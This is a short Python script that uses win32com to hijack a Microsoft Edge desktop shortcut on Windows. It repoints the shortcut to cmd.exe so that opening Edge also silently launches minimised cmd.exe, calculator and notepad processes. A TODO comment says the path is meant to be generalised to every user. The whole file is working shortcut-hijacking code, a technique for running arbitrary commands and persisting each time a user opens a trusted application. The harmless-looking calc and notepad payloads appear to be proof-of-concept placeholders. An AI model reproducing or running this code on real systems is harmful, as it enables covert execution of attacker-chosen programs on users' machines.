import os
try:
    import win32com.client
except ImportError:
    print("Module 'win32com' is not installed. Please install 'pywin32'.")

def modify_edge_shortcuts():
    # New path to the Microsoft Edge shortcut
    edge_shortcut_path = r"C:\Users\UlyssesHill\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk" #TODO: change the filepath to be dynamically linked to use the usernames

    # Modify the specified Edge shortcut
    modify_shortcut(edge_shortcut_path)

def modify_shortcut(shortcut_path):
    try:
        # Use win32com.client to modify the shortcut properties
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)

        target = r"%windir%\system32\cmd.exe"
        arguments = rf'/c start "" "{shortcut.TargetPath}" & start /MIN cmd.exe & start /MIN calc.exe & start /MIN notepad.exe'

        shortcut.TargetPath = target
        shortcut.Arguments = arguments

        shortcut.Save()
        print(f"Shortcut modified: {shortcut_path}")

    except Exception as e:
        print(f"Error modifying shortcut '{shortcut_path}': {e}")

def main():
    modify_edge_shortcuts()

if __name__ == "__main__":
    main()
